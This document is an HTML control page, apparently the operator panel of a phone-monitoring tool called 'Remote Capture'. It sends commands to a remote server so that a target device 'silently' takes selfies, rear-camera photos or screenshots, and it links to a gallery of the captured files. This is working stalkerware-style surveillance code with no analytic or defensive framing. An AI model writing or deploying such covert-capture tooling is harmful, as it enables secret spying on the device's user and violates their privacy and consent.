<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Snapshot Menu</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- GLOBAL THEME (Consistent with Dashboard) --- */
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.15);
            --text-main: #ffffff;
            --accent: #00f3ff; /* Cyan */
            --danger: #ff4444;
        }
        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
            min-height: 100vh;
        }

        /* --- HEADER (New Back Button Style) --- */
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; }
        .back-btn {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            color: #fff; padding: 10px 15px; border-radius: 12px;
            cursor: pointer; text-decoration: none; font-size: 1rem;
            display: flex; align-items: center; justify-content: center;
        }
        .page-title { 
            font-size: 1.2rem; font-weight: bold; 
            color: var(--accent); text-transform: uppercase; letter-spacing: 1px; 
        }

        /* --- CONTENT CONTAINER --- */
        .container { width: 100%; max-width: 400px; margin: 0 auto; }

        /* --- LIST GROUPS --- */
        .list-group { margin-bottom: 25px; }
        .list-title { 
            color: #888; font-size: 0.8rem; margin-bottom: 10px; 
            font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
            padding-left: 5px;
        }
        
        .list-item {
            display: flex; align-items: center; gap: 15px;
            background: var(--glass-bg);
            padding: 16px; border-radius: 12px; margin-bottom: 10px;
            cursor: pointer; transition: 0.2s;
            border: 1px solid var(--glass-border);
        }
        .list-item:active { background: rgba(0, 243, 255, 0.1); transform: scale(0.98); border-color: var(--accent); }
        
        .icon-box {
            width: 40px; height: 40px;
            background: rgba(255,255,255,0.05);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.2rem; color: var(--accent);
        }
        
        .text-content { display: flex; flex-direction: column; flex: 1; }
        .main-text { font-size: 1rem; color: #fff; font-weight: 500; }
        .sub-text { font-size: 0.75rem; color: #aaa; margin-top: 3px; }
        
        /* Loading Animation inside button */
        .spinner {
            border: 2px solid rgba(255,255,255,0.1);
            border-top: 2px solid var(--accent);
            border-radius: 50%; width: 16px; height: 16px;
            animation: spin 1s linear infinite;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* --- BOTTOM ACTION --- */
        .gallery-btn {
            width: 100%; padding: 15px; border-radius: 12px;
            background: linear-gradient(90deg, var(--accent), #00bcd4);
            color: #000; font-weight: bold; border: none; font-size: 1rem;
            cursor: pointer; margin-top: 20px; box-shadow: 0 4px 15px rgba(0, 243, 255, 0.3);
        }
        .gallery-btn:active { transform: scale(0.98); }

    </style>
</head>
<body>

    <div class="header">
        <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
        <div class="page-title">Remote Capture</div>
        <div style="width: 40px;"></div> </div>

    <div class="container">
        
        <div class="list-group">
            <div class="list-title">Camera Controls</div>
            
            <div class="list-item" onclick="triggerCommand(this, 'capture_front')">
                <div class="icon-box"><i class="fa-solid fa-user"></i></div>
                <div class="text-content">
                    <div class="main-text">Front Camera</div>
                    <div class="sub-text">Take a selfie silently</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right" style="color:#555; font-size: 0.8rem;"></i>
            </div>

            <div class="list-item" onclick="triggerCommand(this, 'capture_back')">
                <div class="icon-box"><i class="fa-solid fa-camera"></i></div>
                <div class="text-content">
                    <div class="main-text">Back Camera</div>
                    <div class="sub-text">Capture rear view silently</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right" style="color:#555; font-size: 0.8rem;"></i>
            </div>
        </div>

        <div class="list-group">
            <div class="list-title">Display Controls</div>
            
            <div class="list-item" onclick="triggerCommand(this, 'capture_screen')">
                <div class="icon-box"><i class="fa-solid fa-mobile-screen"></i></div>
                <div class="text-content">
                    <div class="main-text">Screen Shot</div>
                    <div class="sub-text">Capture current screen frame</div>
                </div>
                <div class="spinner"></div>
                <i class="fa-solid fa-chevron-right" style="color:#555; font-size: 0.8rem;"></i>
            </div>
        </div>

        <button onclick="goToGallery()" class="gallery-btn">
            <i class="fa-solid fa-images"></i> View Saved Files
        </button>

    </div>

    <script>
        const API_BASE = 'https://child-v9no.onrender.com'; 
        
        // 1. SECURITY CHECK: ID Validation
        // URL se ID lo, agar wahan nahi hai to LocalStorage check karo
        const urlParams = new URLSearchParams(window.location.search);
        let DEVICE_ID = urlParams.get('id');

        // Agar URL me ID nahi hai, to storage check karo
        if (!DEVICE_ID) {
            DEVICE_ID = localStorage.getItem('monitoring_id');
        }

        // Agar abhi bhi ID nahi mili, matlab unauthorized access hai -> Login pe bhejo
        if (!DEVICE_ID) {
            alert("Unauthorized Access! Device ID not found.");
            window.location.href = 'index.html'; // Wapas login page par
        }

        // Logic to Trigger Command
        function triggerCommand(element, command) {
            const spinner = element.querySelector('.spinner');
            const arrow = element.querySelector('.fa-chevron-right');
            
            // Show Loading
            spinner.style.display = "block";
            if(arrow) arrow.style.display = "none";
            element.style.opacity = "0.7";
            element.style.pointerEvents = "none"; // Prevent double clicking

            // Send Command to Server
            fetch(`${API_BASE}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: command })
            })
            .then(res => res.json())
            .then(data => {
                setTimeout(() => {
                    // Reset UI
                    spinner.style.display = "none";
                    if(arrow) arrow.style.display = "block";
                    element.style.opacity = "1";
                    element.style.pointerEvents = "auto";
                    
                    // Simple Toast Alert
                    // alert("Command Sent Successfully!");
                }, 1000);
            })
            .catch(err => {
                console.error("Error:", err);
                alert("Failed to send command. Device might be offline.");
                
                spinner.style.display = "none";
                if(arrow) arrow.style.display = "block";
                element.style.opacity = "1";
                element.style.pointerEvents = "auto";
            });
        }

        function goToGallery() {
            window.location.href = `saved_files.html?id=${DEVICE_ID}`;
        }
    </script>

</body>
</html>
